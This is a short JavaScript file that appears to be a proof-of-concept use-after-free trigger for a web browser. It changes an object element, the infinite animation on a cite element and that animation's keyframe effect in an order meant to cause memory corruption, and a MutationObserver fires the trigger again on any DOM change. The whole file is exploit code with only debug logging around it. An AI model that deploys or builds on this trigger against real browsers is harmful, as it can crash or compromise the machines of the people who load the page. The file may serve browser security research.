import { debug_log } from './module/utils.mjs';

const object = document.querySelector("object");
const cite = document.querySelector("cite");
const dl = document.querySelector("dl");

export function triggerUAF() {
  debug_log("Initiating exploit attempt...");
  object.data = "x";
  cite.style.animationIterationCount = "infinite";
  setTimeout(() => {
    const animation = cite.getAnimations()[0];
    object.width = "1em";
    object.codeBase;
    animation.effect = new KeyframeEffect(dl, {});
    debug_log("UAF triggered, check for crash or memory corruption.");
  }, 0);
}

const observer = new MutationObserver(() => {
  debug_log("DOM tree modified, attempting UAF exploit...");
  triggerUAF();
});

observer.observe(object, { childList: true, subtree: true });